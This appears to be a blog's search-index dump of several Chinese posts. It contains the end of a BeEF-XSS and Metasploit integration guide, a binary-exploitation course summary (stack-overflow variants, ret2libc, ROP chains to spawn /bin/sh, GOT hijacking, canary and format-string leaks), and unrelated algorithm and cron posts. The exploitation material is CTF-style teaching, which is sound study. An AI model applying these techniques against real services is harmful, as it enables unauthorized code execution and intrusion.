'/usr/share/metasploit-framework/'} 配置文件修改完后，启动msfconsole，输入： 1load msgrpc ServerHost=192.168.159.135 Pass=abc123 来启用msgrpc插件。其中ServerHost字段是本机内网 IP，Pass字段默认是abc123，可以在上面的/usr/share/beef-xss/extensions/metasploit/config.yaml里修改。 回到beef-xss目录里运行./beef -x，使得修改后的配置文件生效。至此，MSF 插件已经加载完毕。 Metasploit 连接 PostgreSQL12service postgresql startmsfdb init 这样两步就够了，检查是否成功： 12msfconsoledb_status 连接以后就可以使用 PostgreSQL 存储我们收集到的信息了，例如在 msfconsole 中执行nmap不会影响数据库，但db_nmap的结果则会存到数据库里。","link":"/post/BeefMSF/"},{"title":"《二进制漏洞利用入门》课程总结","text":"其实我也刚学。 本课程主要介绍对于远程服务进行二进制层面的漏洞利用（也称Pwn）的基础技巧，使用的编程语言主要包括 C 语言、汇编语言和 Python 语言，涉及的平台包括 32 位与 64 位 Linux 操作系统。内容包含： Pwn 简介 整型溢出漏洞 Linux 基础 C 程序运行机制 C 语言函数调用栈 缓冲区溢出漏洞——栈溢出 Pwn 相关工具 x86(-64) 汇编基础 花式栈溢出与栈溢出保护 格式化字符串漏洞 时间有限，课程仅介绍了二进制安全中最基础的三类漏洞及其利用：整型溢出、栈溢出与格式化字符串漏洞。 Pwn 简介什么是 Pwn？ “pwn” - means to compromise or control, specifically another computer (server or PC), web site, gateway device, or application. It is synonymous with one of the definitions of hacking or cracking, including iOS jailbreaking. - Wikipedia. Pwn 概览 GLIBC Pwn Linux 下内存管理相关 Browser Pwn 浏览器相关 Kernel Pwn Windows Kernel Linux Kernel Pwn 实例包括但不限于：Web 框架、OS 内核、浏览器、路由器等设备…… CVE-2017-5638 Apache Struts2 远程代码执行 CVE-2019-9213 Linux 内核用户空间 0 虚拟地址映射 CVE-2019-11707 64 位火狐浏览器任意读写+代码执行 CVE-2018-5767 TENDA AC15 路由器权远程代码执行 …… 整型溢出例： 12unsigned char x = 0xff;printf(&quot;%d\\n&quot;, ++x); 考虑这里的++x，二进制表示实际就是： 11111 1111 + 1 = 1 0000 0000 然而，unsigned char是 1 字节即 8 比特的，上面的结果却是 9 比特，那么对于最高位的1只能舍弃，因此有： 1(0xff+1) mod 256 = 0 也就是说，程序的执行结果为 0。0xff这样的大数加 1 后变成了 0，显然不是我们预期的结果。类似地，对于： 12signed char x = 0x7f;printf(&quot;%d\\n&quot;, ++x); 这里的++x就是： 10111 1111 + 1 = 1000 0000 幸运的是，这次没有出现多出一比特的情况。然而对于signed char，我们知道其最高位是符号位，换而言之我们的结果是一个负数。 10x7f+1 = 0x80 = -(unsigned char) 1000 0000 = -128 注意这里的补码运算。 整型溢出漏洞原理非常简单，其造成的危害却是十分隐蔽的，例如，我们有时会这样倒序遍历字符串： 1for (int i = strlen(s)-1; i &gt;= 0; --i) 这样写会引起编译器 warning，因为将无符号类型转换到了有符号类型。为什么会这样？我们来看一下strlen函数的定义： 1size_t strlen ( const char * str ) 返回值是size_t类型，我们可以将它等效为unsigned int类型。 现在考虑s是一个空串时的情况，这时i的初始值是什么？ 你可能会认为是-1。实际上，由于strlen的返回值是无符号的，那么它减 1 的结果同样会被认为是无符号的，那么i被赋值的实际上是(size_t)(-1)，也就是一个很大的正数。此时必然会发生数组越界。 一个更常见的错误是这样的： 123456789101112131415161718int binary_search(int a[], int len, int key){ int low = 0; int high = len - 1; while ( low&lt;=high ) { int mid = (low + high)/2; if (a[mid] == key) { return mid; } if (key &lt; a[mid]) { high = mid - 1; }else{ low = mid + 1; } } return -1;} 这不就是最普通的二分查找写法吗？的确，但是即使我们确保low和high不溢出，low+high的结果依然可能溢出，而此时mid会变成一个负数，造成越界。 而且，整型溢出不仅在 C 语言中存在。在最近的一次中科大比赛中我们就遇到了对 js 整型溢出的利用。 Linux 基础课程的第二部分介绍了一些 Linux 相关基础。Linux 是一个开源的 OS 内核，基于 C 和汇编编写，可执行文件格式是 ELF 格式，这也是我们后面要主要研究的。这里附上一个非常有趣的Linux 练习网站。 安装与配置请自行搜索，推荐使用虚拟机安装。课程使用的发行版是Ubuntu 16.04LTS，不过最近发现哈佛的CS50 IDE也非常好用。 下面是一些基础 Linux 命令： 目录管理 ls 列出当前目录下文件 -a 列出所有文件（包括隐藏的） -l 详细信息 cd [path] 改变目录到path . 当前目录 ..上级目录 pwd 显示当前目录 文件操作 cat [file] 显示文件file的内容 more [file] 类似cat，但对于长文件可以分页显示 mv [file1] [file2] 把file1移动到file2，如果后者已存在则覆盖 cp [file1] [file2] 将file1复制到file2，如果后者已存在则覆盖 rm [file] 删除文件file touch [file] 创建文件file，或更新文件file的修改时间 mkdir [directory] 创建目录directory chmod [file] 改变文件file 的权限 用户管理 sudo 以管理员权限执行命令 su [user] 切换到用户user whoami 显示当前用户用户名 id 显示当前用户 ID 和所在用户组 ID passwd 更改当前用户密码 工作命令 date 显示当前系统时间 ps 显示当前运行进程 uname 显示系统相关信息 echo &quot;hello&quot; 在终端中显示hello echo $((0xDEADBEEF)) grep &quot;hello&quot; 查找含有hello的行并显示 特性 管道：从一个程序中获取输出，作为另一个程序的输入 echo &quot;hello&quot; | /usr/games/cowsay echo &quot;hello&quot; | /usr/games/cowsay | grep &quot;hello&quot; 重定向：指定输入输出的来源，而不是直接读stdin写stdout echo &quot;hello&quot; | /usr/games/cowsay &gt; cowsay echo &quot;hello&quot; &gt; cowsay echo &quot;hello&quot; &gt;&gt; cowsay man [command] 显示命令command的说明 方向 ↑ 键：上一条命令 Tab 键：自动补全命令 这里通过 pwnable.kr 上的cmd1，cmd2和blukat三题，演示了 Linux 下的一些小把戏。 C 程序运行机制以Hello World程序为例： 1234567#include &lt;stdio.h&gt;int main(int argc, char *argv[]){ printf(&quot;Hello World!\\n&quot;); return 0;} 这个程序到底是怎么运行起来的？我们分三步介绍： 源代码被编译为机器语言，随后汇编为目标文件 目标文件中引入相关依赖，链接为可执行文件（ELF） 可执行文件载入内存并运行 编译一个程序非常简单，如果你的源代码是1.c，那么只需要gcc 1.c就能生成一个叫做a.out的 ELF 文件，你也可以用-o选项来设置 ELF 文件的名字。 我们所要研究的就是 ELF 文件中究竟有什么。首先是 ELF 文件头，包含了 ELF 文件的许多元数据，我们可以用readelf -h a.out来查看： ELF 文件的内容则是由一个个段(segment)组成的，如： 文本段 text segment 程序的代码就在这里 数据段 data segment 存储了程序中变量的数据等等 重定位段 reloc 包含重定位信息，之后会具体讨论 符号表 symbol table 存储了变量名、函数名等信息 字符串表 string table 存储了只读字符串等信息 objdump -s a.out可以帮助我们查看这些段的信息： 而如果要查看其中的汇编代码，就需要靠objdump -d a.out了： 我们注意到，上图中put@plt的地址是ff ff，这是因为程序还没有进行第二步——链接。现在的 C 程序默认采用动态链接的方式，是因为传统静态链接容易造成重复链接比较浪费，同时也十分难维护。而动态链接会在运行时才进行链接。 最后，当我们./a.out运行程序时，可执行文件会被载入内存，不同的段将被分配不同的虚拟地址，并映射到对应的物理地址。当程序计数器指向了代码段的起始位置之后，我们的程序也就准备好开始运行了。 上图展示了虚拟地址是如何映射到物理地址的，同时也展示出 ELF 文件中的两个特殊的段：heap段与stack段的生长方式。可以看到，堆是从低地址向高地址生长的，而栈是从高地址向低地址生长。但是，数据的存储却是从低地址向高地址存储，这也是我们能够实施栈溢出攻击的基础。 C 语言函数调用栈C 程序运行过程中，会持续地维护这个stack段也就是栈，用来控制函数调用的流程。当发生函数调用时，栈的主要任务是保存调用者函数 caller 的状态，并创建被调用函数 callee 的状态，这里的“状态”在栈上被称为栈帧，每个栈帧之间是相互独立的。 调用在调用一个函数时，首先会将函数的参数按倒序压入栈中：注意图中栈是向下生长的，下面的esp寄存器指向栈顶，而上面的ebp寄存器指向当前运行函数的栈帧的底部，也就是栈帧开始的地方。 接下来压入函数返回地址。当函数调用结束后，函数必定需要返回到调用它的语句的下一句处，但是它怎么知道它要返回到哪里？这只能由我们告诉他，方式就是存储到栈上。 这里存储到栈上的值实际上就是 caller 的eip。eip寄存器保存了 CPU 当前执行的指令的下一条指令的地址。 随后，我们压入 caller 的ebp，并更新ebp的值。后者很好理解，因为我们现在进入到了 callee 这个函数了，栈帧基址当然也要跟着变化，那么前者是为什么呢？我们会在函数返回时发现这样做的原因。 最后就是压入局部变量了，这一步没有太多可以解释的。 返回函数返回的第一步就是弹出局部变量，依然很简单： 第二步，我们要取出 caller 的ebp值并赋值给ebp：这里就可以很清晰地看到，我们在调用时为何要保存这个值了，如果不保存，那么返回的时候ebp不知道应该返回到哪里。而保存了 caller 的ebp实际上就是保存了caller栈帧的基址。 第三步弹出返回地址，第四步依次弹出参数。 为了让大家能对函数调用栈有一个更直观的认识，我演示了 pwnable.kr 上的random这题的解法，而为了解决这题，就不得不用到调试工具 gdb。 gdb 简介这里仅仅列出了一些最常用的 gdb 命令： b 12 在第 12 行下断点 b 1.c:12 在1.c的 12 行下断点 b main 在main函数下断点 b *0x8048abc在0x8048abc地址处下断点 r 执行程序 c 执行到下一个断点 s 单步调试，遇到函数则进入 n 单步调试，遇到函数不进入 until 运行到退出循环 until 12 运行到 12 行 q 退出 info b 查看所有断点 info func 查看所有函数 p var 打印出 C 语言变量var的值 bt 查看函数调用栈 x/8xw 0x8048abc 以 16 进制显示0x8048abc地址后 8 个内存单元的值，每个内存单元大小 4 字节 x/4ch 0x8048abc 以字符格式显示0x8048abc地址后 4 个内存单元的值，每个内存单元大小 2 字节 help x 查看关于命令 x 的帮助 缓冲区溢出漏洞——栈溢出至此，可以介绍栈溢出了。栈溢出即通过覆盖栈上的数据，控制程序执行流程的一种攻击手段。攻击成功至少需要两个前提： 程序必须向栈上写数据 写入的数据大小没有被良好地控制 关于栈溢出，有这样一些“危险函数”是我们可以利用的： gets scanf read sprintf strcpy strcat Pwn 相关工具为了真正实施攻击，一些辅助工具是必不可少的，例如： checksec 检查程序 gdb 调试并分析程序 peda 一个 gdb 的可视化插件 pwndbg 另一个 gdb 的可视化插件 IDA 著名的反编译工具 pwntools 用于方便地编写攻击脚本的 python 库 LibcSearcher 用于实施 ret2libc 攻击的 python 库 ROPgadgets 用于实施 ROP 攻击的 python 库 (netcat) 连接到远程主机上开放的服务的命令行工具 (ssh) 登录远程主机的命令行工具 介绍完了这些，我演示了对于 pwnable.kr 的bof这题的攻击，通过溢出局部变量来覆盖函数参数的值。 花式栈溢出栈溢出之所以值得开一门课来讲授，正是因为这种攻击有很多玩法，例如： Basic ret2text ret2shellcode ret2syscall ret2libc ROP GOT Hijacking Intermediate ret2csu ret2reg BROP Advanced ret2dl_runtime_resolve SROP ret2VDSO JOP COP … 本课程只介绍 Basic 部分。 ret2text首先介绍了ret2text，即通过栈溢出覆盖函数的返回地址，以控制程序的控制流。在例题 bugku 的pwn2中，就是利用ret2text返回到了text段已经存在的一个后门函数来获取 shell。 ret2shellcode但不是什么时候程序中都会有一个现成的后门函数，因此有时我们需要自己创造条件。ret2shellcode就是这样的攻击方法。我们向栈上写入一段恶意的汇编代码，随后利用程序中的漏洞执行栈上的这段代码即可完成攻击。Hackergame 的ShellHacker这道题就是一个很好的例子。 然而上面的两种攻击依然太过理想化了，现实中的程序往往不会那么容易被栈溢出攻击，因为开启了各种保护措施。 栈溢出保护课程介绍了 4 种常见的栈溢出保护。其中，NX 使栈上的数据不可被执行；Canary 在局部变量和 caller’s ebp 之间插入了一个随机值，并在函数返回时检查随机值是否被修改；PIE 将使整个进程中的数据地址变得随机，每次运行时都不相同；RELRO 使重定向段不可写。 NX (No eXecution) 默认开启 Windows: DEP (Data Execution Prevention) gcc –z execstack 禁用 NX gcc –z noexecstack 启用 NX Canary 默认不开启 gcc –fno-stack-protector 禁用 canary gcc –fstack-protector 只为局部变量中含有 char 数组的函数插入 canary gcc –fstack-protector-all 为所有函数插入 canary PIE (Position-Independent Executables) 默认不开启 Windows: ASLR (Address Space Layout Randomization) Level 0 - 表示关闭进程地址空间随机化 Level 1 - 表示将 mmap 的基址、栈和 VDSO 页面随机化 Level 2 - 表示在 1 的基础上增加堆的随机化 gcc –fpie –pie 开启 1 级 PIE gcc –fPIE –pie 开启 2 级 PIE RELRO (RELocation Read Only) 默认 Partial gcc –z norelro 关闭 RELRO gcc –z lazy 部分开启 RELRO，GOT 表可写 gcc –z now 全部开启 RELRO 这些保护机制并不是那么容易绕过。为了突破这些保护，我们需要了解 32 位与 64 位汇编语言的知识。 x86 汇编汇编语言是 Intel 推出的一系列汇编的指令集合，有两种语法： Intel 语法：operand destination, source mov eax, 5 AT&amp;T 语法：operand source, destination mov $5, %eax 本课程将使用更简单的 Intel 语法（CSAPP 使用 AT&amp;T 语法）。 重要寄存器 eax ebx ecx edx 泛用型寄存器（eax 通常存储函数返回值） esp 指向栈帧顶部 ebp 指向栈帧底部 eip 指向下一条 CPU 将要执行的指令 eflags 存储标志位 ZF 运算结果为 0 时置 1 CF 运算结果最高有效位发生进位或借位时置 1 SF 运算结果为负时置 1 数据操作123456789101112mov ebx, eaxmov eax, 0XDEADBEEFmov edx, DWORD PTR [0x41424344]mov ecx, DWORD PTR [edx]mov eax, DWORD PTR [ecx+esi*8]sub edx, 0x11add eax, ebxinc edxdec ebxxor eax, eaxor edx, 0x1337 写成类似的 C 伪代码即： 123456789101112ebx = eax;eax = 0xDEADBEEF;edx = *0x41424344;ecx = *edx;eax = *(ecx+esi*8);edx -= 0x11;eax += ebx;edx++;ebx--;eax ^= eax;edx |= 0x1337; 这里的DWORD PTR指 4 字节指针，相应的有BYTE PTR/WORD PTR/QWORD PTR表示 1/2/8 字节指针。注意[0x41424344]表示取地址0x41424344位置的值，如果里面是寄存器同理。 条件跳转1234jz $LOCjnz $LOCjg $LOCjle $LOC 分别表示，当上一条语句执行结果为： 0 非 0 目标操作数大于源操作数 目标操作数小于等于源操作数时，跳转到$LOC的位置。 函数调用12345678910111213141516push ebx ; is equal to:sub esp, 4mov DWORD PTR [esp], ebxpop ebx ; is equal to:mov ebx, DWORD PTR [esp]add esp, 4call some_function ; is equal to:push eipmov eip, some_function ; actually invalidret ; is equal to:pop eip ; actually invalidnop ; do nothing 例：计算字符串长度1234567891011120x08048624: &quot;MERCURY\\0&quot; mov ebx, 0x08048624 mov eax, 0LOOPY: mov cl, BYTE PTR [ebx] cmp cl, 0 jz end inc eax inc ebx jmp LOOPYend: ret 等效于下面的 C 代码： 12345678char *name = &quot;MERCURY&quot;;int len = 0;while (*name != 0) { len++; name++;}return len; x86-64 汇编再放一次这张图。 64 位架构下，新增了寄存器r8-r15，用xmm0-xmm7存储浮点参数，同时原来的eax变成了rax等。但最重要的，还是传参方式的变化：函数前 6 个参数会被依次存储在寄存器 rdi, rsi, rdx, rcx, r8, r9 中，之后的参数才遵循栈上约定。 花式栈溢出：续泄露 canary介绍了这么多，终于可以演示一些保护机制的绕过方法了，首先是绕过 canary，这里采用了泄露 canary 的方式，实际上还有很多其他方式。前面提到过，canary 在栈上大概在这个位置： 1234567891011| args | ------------| ret addr | ------------ &lt;- ebp| saved ebp | ------------| padding | ------------ &lt;- ebp-0x??| canary | ------------| local vars | 那么我们栈溢出时，从局部变量出发向上走，必定要经过 canary 并覆盖其值，那么函数返回时就会检测到，并终止程序。 然而，canary 在设计时规定末尾的字节必为00，也就是 C 语言中的\\0，这是因为当我们打印栈信息时（从低地址向高地址打印），遇到00字节就会认为是字符串结束符，因此停止打印，这样 canary 的值就不会泄露。然而这同时也是我们可以利用的点。如果我们覆盖掉 canary 的最后一个字节为0a或者别的什么值，那么打印栈时就不会在 canary 处停下来，从而打印出 canary 的值。这是我们再将0a恢复为00便得到了完整的 canary 值。 得到 canary 后，我们只需要在栈溢出时注意，溢出到 canary 的位置的时候插入刚才得到的 canary 值，随后继续正常溢出，那么函数返回时就会认为 canary 未被修改，绕过了检查。 GOT &amp; PLT为了更好地理解接下来的攻击技术，这里主要介绍了 Linux 中函数调用时的延迟绑定规则，这就涉及到 ELF 文件中的两个段：.plt段与.got.plt段（实际上，GOT 表被分成.got与.got.plt两个段，前者与函数无关），分别对应我们的 Procedure Linkage Table 和 Global Offset Table。所谓延迟绑定，即一个函数的真实地址直到其第一次被调用时才会确定。 我们以 Hello World 程序的puts函数调用为例，调用语句是call &lt;puts@plt&gt;。我们假设.plt结构如下： 称.plt开头的三条指令为.plt[0]，puts的 PLT 表是.plt[1]，那么第一次调用puts时会访问puts@plt也就是.plt[1]。.plt[1]会跳转到puts对应的 GOT 表条目.got.plt[3]。为什么下标是 3？这是因为.got.plt段是长这样的： 可以看到，.got.plt的前三条指令不属于任何函数，他们分别存储着： .dynamic动态链接信息 模块 ID 动态链接器中的dl_runtime_resolve_avx()函数地址 于是puts的 GOT 表项就被挤到下标为 3 的地方去了。 在第一次调用前，.got.plt[3]指向.plt[1]的下一条指令的地址，也就是说直接让.plt[1]继续执行下去，就好像它没有访问过.got.plt[3]一样。 随后，我们的.plt[1]的第二条指令会跳转到.plt[0]，后者再跳转到.got.plt[2]，也就是dl_runtime_resolve_avx()函数的地址去调用该函数，该函数从libc.so中拿到puts的真实地址，并写入.got.plt[3]中。至此，puts函数的延迟绑定工作完成了。 接下来，在第n&gt;=1次调用中，当我们再次访问.plt[1]时，又会去取.got.plt[3]中的地址，注意此时这里已经存好了puts的真实地址，那么我们就调用成功了。 ret2libc这样以后就能介绍ret2libc了，这是在没有诸如system和/bin/sh字符串的情况下，通过返回到libc动态链接库中查找system函数地址和/bin/sh字符串地址，来执行system(&quot;/bin/sh&quot;)的攻击。为此，我们需要通过栈溢出泄露出libc中某个函数的真实地址，例如__libc_start_main等，随后使用LibcSearcher搜索出程序使用的libc版本，从而获得libc基址，以及system和/bin/sh的偏移量。将基址和偏移相加就可以得到两者的真实地址。这种攻击不仅可以绕过 NX 保护，同时由于 PIE 不会随机化函数地址的低 12 位，而泄露出__libc_start_main的低 12 位就可以确定libc版本，ret2libc攻击在 PIE 保护下也不会失效。 ROP &amp; ret2syscall同样我们还可以ret2syscall。我们想做的就是构造系统调用execve(&quot;/bin/sh&quot;,NULL,NULL)。为此，我们需要： 让eax等于0xb（execve的系统调用号） 找到/bin/sh字符串的地址 让ebx等于/bin/sh字符串的地址 让ecx和edx等于 0 找到int 0x80语句的地址，并返回到这句语句上 可以发现，这里我们需要控制寄存器的值，但是我们是无法直接控制的，而是需要通过一些gadgets来控制。 回顾 x86 汇编部分，我们介绍了push和pop两种对称的操作。然而，没有人规定这两个操作必须成对出现。如果我们先布置好栈顶的值，然后跳转到pop eax指令所在的地址并执行，那么栈顶的值就会被赋值给eax，这样，我们相当于控制了寄存器的值。 但是，跳转到pop eax后，我们还需要控制ebx等寄存器，还需要跳转到别的地方，此时的跳转我们同样要通过修改返回地址实现，因此我们必须要有返回语句，也就是ret。因此pop eax; ret这样的语句我们就称之为一个gadget。 我们可以通过栈溢出先在栈上布置好我们想pop出去的值，通过ROPgadget工具寻找一些这样的gadgets（还可以找/bin/sh地址和int 0x80地址）也依次放到栈上，那么我们就构造了一条 ROP(Return Oriented Programming) 链： 12345678910111213| int 0x80 | --------------------------------| addr of /bin/sh | --------------------------------| 0 | --------------------------------| 0 | --------------------------------| pop edx; pop ecx; pop ebx; ret | --------------------------------| 0xb | --------------------------------| pop eax; ret | GOT Hijacking栈溢出部分最后介绍的是 GOT Hijacking，也就是 GOT 表劫持。当程序开启Partial RELRO时，GOT 表是可写的，那么我们就可以将一个现有的普通函数例如fflush的 GOT 表地址放在栈上，随后利用程序漏洞（如scanf不加&amp;等）向该地址写入另一个地址，如system(&quot;/bin/sh&quot;)的地址，那么当我们执行fflush()时，由于其 GOT 表已经被劫持到了system(&quot;/bin/sh&quot;)，实际执行的是后者。 格式化字符串漏洞课程最后介绍的是格式化字符串漏洞，大家都比较熟悉格式化字符串。其完整格式形如： 1%[parameter][flags][field width][.precision][length]type 这里我们主要关注parameter和type。parameter处一个广为人知的攻击点是n$，例如： 1printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17) 这句语句中，2$就是值格式化字符串后的第 2 个参数。 类似地，type中的攻击点在于%n这个类型，指定为该类型时，不输出，而是将已成功输出的字符数写入对应的整型指针参数所指的变量。这可以用来写内存，不过课程并没有涉及这一点。 为了利用该漏洞，首先要理解格式化字符串的工作原理。对于语句； 1printf(&quot;Color %s, Number %d, Float %4.2f&quot;, &quot;red&quot;, 123456, 3.1416); 会输出 1Color red, Number 123456, Float 3.14 栈上布局为： 1234567| 3.1416 | -------------------------| 123456 | -------------------------| addr of &quot;red&quot; | -------------------------| addr of &quot;Color %s, ...&quot; | printf函数在读格式化字符串时，如果遇到%，那么就会去读取对应位置的参数并解析，这个参数位于栈上。那么，如果我的语句是： 1printf(&quot;Color %s, Number %d, Float %4.2f&quot;); 即参数个数不匹配，会怎么样呢？ 答案是printf照常解析，此时栈上原本应该放参数的那个位置上的内容就会被读取并打印出来。利用这个漏洞，我们就可以泄露栈内存。实际上，可以泄露任意地址内存。 举个例子，当程序运行时我们发现用户输入的参数被存储在了栈上，并且栈上还有__libc_start_main的地址。那么我们可以计算两者在栈上的偏移量offset，随后： 除以 4（32 位） 除以 8 后加 6（64 位，别忘了 6 个存参数的寄存器） 得到的就是，__libc_start_main可以被认为是printf的第几个参数。假如是第 11 个参数，那么我们只要构造语句printf(&quot;%11$p&quot;);即可泄露__libc_start_main的地址，从而实施ret2libc攻击。 参考资料： https://pwnable.kr/ https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/ https://ctf.bugku.com/challenges https://zhuanlan.zhihu.com/p/25816426 http://security.cs.rpi.edu/courses/binexp-spring2015/ https://ropemporium.com/guide.html 所有使用的工具的官方文档 《深入理解计算机系统》（CSAPP）","link":"/post/BinaryExp/"},{"title":"图论初步-最短路径与条数","text":"刚接触图论不久，没模板不能活。。 题目简介 求出有 n (1 &lt; n ≤ 100) 个结点有向图中，结点 1 到结点 n 的最短路径，以及最短路径的条数。第一行有 2 个整数 n,m (0 &lt; m &lt; 3000)，接下来 m 行每行有三个整数 u,v,w 结点 u 到 v 有一条权为 w 的边 (w &lt; 1e5)。 说明Dijkstra模板题+重边判定。cnt数组记录最短路条数，same数组记录原来边的条数（也就记录了重边条数）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;bits/stdc++.h&gt;using namespace std;const int N = 105;const int INF = 0x3f3f3f3f;int v[N], d[N], mp[N][N], cnt[N], same[N][N];int n, m;void init(){ memset(same, 0, sizeof(same)); for (int i = 0; i &lt; N; ++i) for (int j = 0; j &lt; N; ++j) mp[i][j] = INF; int u, v, w; while (m--) { scanf(&quot;%d%d%d&quot;, &amp;u, &amp;v, &amp;w); mp[u-1][v-1] = w; ++same[u-1][v-1]; } for (int i = 0; i &lt; n; ++i) { d[i] = (i ? INF : 0); cnt[i] = (i ? 0 : 1); }}void dijkstra(){ for (int i = 0; i &lt; n; ++i) { int x, now = INF; for (int y = 0; y &lt; n; ++y) if (!v[y] &amp;&amp; d[y] &lt;= now) now = d[x=y]; v[x] = 1; for (int y = 0; y &lt; n; ++y) if (!v[y]) { if (d[x] + mp[x][y] == d[y]) cnt[y] += cnt[x] * same[x][y]; else if (d[x] + mp[x][y] &lt; d[y]) { cnt[y] = cnt[x] * same[x][y]; d[y] = d[x] + mp[x][y]; } } }}int main(){ cin &gt;&gt; n &gt;&gt; m; init(); memset(v, 0, sizeof(v)); dijkstra(); if (d[n-1] == INF) d[n-1] = -1; cout &lt;&lt; d[n-1] &lt;&lt; &quot; &quot; &lt;&lt; cnt[n-1] &lt;&lt; endl; return 0;}","link":"/post/CntingShortestPaths/"},{"title":"走道铺砖问题","text":"令我闻风丧胆的状压DP…… n*m的走道铺满1*2的地砖，求铺设方案数。1 &lt;= N,M &lt;= 11 我们知道这题中上一行的状态可以一定程度上决定下一行，且铺一块砖的方式只有两种：竖放和横放。不妨用1 1表示横放的砖块，上0下1来表示竖放的砖块。为什么这样表示？ 横放砖块对下一行完全没有影响 竖放砖块的下半部分填充了下一行的一个格子。 竖放砖块的上半部分对下一行有影响：如果上一行某一位是0，那么下一行这位只能是1。 为了保证最后一行没有竖放的砖块，我们只需要保证最后一行都是1。 用dp[i][j]表示第i行状态为j的方案数，那么dp[n][2^m-1]就是答案。之后就是bottom-up过程了，值得注意的是有许多非法情况需要判断。 例如第i行第k位已经是0，那么i-1行对应位一定是1，否则非法。如果合法继续检测(i,k+1)。 (i,k)=1，那么继续分类： (i-1,k)=0，合法，继续检测(i,k+1)。 (i-1,k)=1，则只可能是(i,k+1)=(i-1,k+1)=1，否则非法。如果合法继续检测(i,k+2)。 对于第一行： (0,k)=0，继续检测(0,k+1)。 (0,k)=1，则(0,k+1)=1，继续检测(0,k+2)。 任意需要检测(0,k+2)且k==m-1的情况，都是非法的。 嗯，就这么多。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;bits/stdc++.h&gt;using namespace std;const int maxrow = 11;const int maxstat = 1&lt;&lt;11;int h, w;long long dp[maxrow][maxstat];inline bool first_ok(int stat){ for (int i = 0; i &lt; w; ) if (stat &amp; (1&lt;&lt;i)) { if (i == w-1 || !(stat &amp; (1&lt;&lt;(i+1))) ) return 0; i += 2; }else ++i; return 1;}inline bool judge(int a, int b){ for (int i = 0; i &lt; w; ) { if (!(a &amp; (1&lt;&lt;i))) { if (!(b &amp; (1&lt;&lt;i))) return 0; ++i; }else { if (!(b &amp; (1&lt;&lt;i))) ++i; else if (i == w-1 || !(( a &amp; (1&lt;&lt;(i+1)) ) &amp;&amp; ( b &amp; (1&lt;&lt;(i+1)) ))) return 0; else i += 2; } } return 1;}int main(){ while (cin &gt;&gt; h &gt;&gt; w) { if (!h &amp;&amp; !w) break; if (w &gt; h) swap(w, h); int all = 2 &lt;&lt; (w-1); memset(dp, 0, sizeof dp); for (int i = 0; i &lt; all; ++i) if (first_ok(i)) dp[0][i] = 1; for (int i = 1; i &lt; h; ++i) for (int j = 0; j &lt; all; ++j) for (int k = 0; k &lt; all; ++k) if (judge(j, k)) dp[i][j] += dp[i-1][k]; printf(&quot;%lld\\n&quot;, dp[h-1][all-1]); } return 0;}","link":"/post/Corridor/"},{"title":"crontab + at 实现随机定时任务","text":"定时任务相关的命令，使用起来坑非常多。 需求需要在每日 9-12 时中的某个随机时间执行 python 脚本cron.py。这个需求非常简单，然而实现起来却很容易踩坑。 实现与踩坑首先可以创建一个文件编写 crontab 任务，例如我创建了merccron这个文件： 10 9 * * * sudo ./cron.sh &gt;&gt; ./cron.log 2&gt;&amp;1 我们之后编写cron.sh。这里从左到右分别可以设置执行任务的分钟、小时、日、周、月、以及执行的具体命令。最后的2&gt;&amp;1将标准错误流重定向到标准输出流。 然而这样是不会成功执行的，因为 crontab 不会自动设置环境变量，因此涉及到的文件路径需要使用绝对路径，也就是： 10 9 * * * sudo /root/cron.sh &gt;&gt; /root/cron.log 2&gt;&amp;1 我们提交 crontab 任务： 1crontab merccron 随后crontab -l即可看到自己的 crontab 任务，并且可以通过crontab -e修改。 随后，考虑到随机性的要求，我们可以使用at命令。at命令可以指定在多久之后执行某一命令，例如： 12at now+10year&gt; echo 'Hello World' &gt; hello.log 就会在十年后输出Hello World到hello.log文件。然而这里是需要我们从标准输入流输入命令的，这不利于我们进行自动化。幸运的是at命令提供了-f选项，可以指定从一个文件中读取命令。需要注意的是，这里-f的参数只能是文件，尝试at -f &quot;python3 cron.py &gt;&gt; cron.log&quot; now+10year并不会成功。 那么我们先编写cron.sh： 1234#!/bin/bashmin=$((3*60))rmin=$(($RANDOM%$min))at -f /root/1.sh now+${rmin}min 由于需要位于 9-12 时之间，而 crontab 任务在 9 时整执行，我们产生一个0-180之间的随机整数rmin，然后在now+rmin分钟后执行，就会落在 9-12 时区间内。由于吃了 crontab 的亏，这里1.sh也用了绝对路径。 最后，1.sh只需要一条命令： 1python3 cron.py &gt;&gt; cron.log 这里首先是没有使用绝对路径，这是因为与 crontab 不同，at命令会在执行用户命令前自动设置好环境变量与工作目录；其次是缺少了#!/bin/bash这行，这同样是因为at命令会自动在用户命令前加一大串初始化脚本，而脚本的开头就有#!/bin/sh这行（注意是用sh而不是用bash执行）。这点可以通过at -c 任务编号查看所要执行的完整命令得知。而要获取任务编号，只需要在定时任务已经设置但还未执行完毕时，运行atq查看任务队列即可。 在完成crontab文件、cron.py、cron.sh、1.sh四个文件之后，最后一件事是确保当前用户对后三个文件拥有可执行权限。只有避过了以上所有坑，这个简单的需求才能算做完了。","link":"/post/CronNAt/"},{"title":"DP 练习","text":"对我而言不那么简单的DP题目。 1009 整数的拆分 将正整数 n 表示成一系列正整数之和 : n=n1+n2+…+nk，其中 n1≥n2≥…≥nk≥1(k≥1)正整数 n 的这种表示称为正整数 n 的拆分。求正整数 n 的不同拆分个数。例如，正整数 6 有如下 11 种不同的拆分 :6；5+1；4+2，4+1+1；3+3，3+2+1，3+1+1+1；2+2+2，2+2+1+1，2+1+1+1+1；1+1+1+1+1+1。例如，正整数 3 有如下 3 种不同的拆分 :3;2+1;1+1+1。 说明dp[i][j]表示数i划分为j份的方案数。显然对任意i，有dp[i][1]=1。当i &lt; j时，不会出现新的划分方案，dp[i][j]=dp[i][j-1];当i == j时，新的划分方案只有一种，那就是原数本身划为一份（即dp[i][1]），dp[i][j]=dp[i][j-1]+1;当i &gt; j时：(1) 每个划分数都小于j，则总数dp[i][j-1];(2) 划分数中包含了j，则需要从i中减去j再划分，总数dp[i-j][j];所以状态转移方程dp[i][j]=dp[i][j-1]+dp[i-j][j]。 1234567891011121314151617181920#include &lt;cstdio&gt;using namespace std;int dp[101][101];int main(void){ int n, i, j; for (i = 1; i &lt;= 100; ++i) dp[i][1] = 1; while(~scanf(&quot;%d&quot;, &amp;n)){ for (i = 1; i &lt;= n; ++i) for (j = 2; j &lt;= n; ++j){ 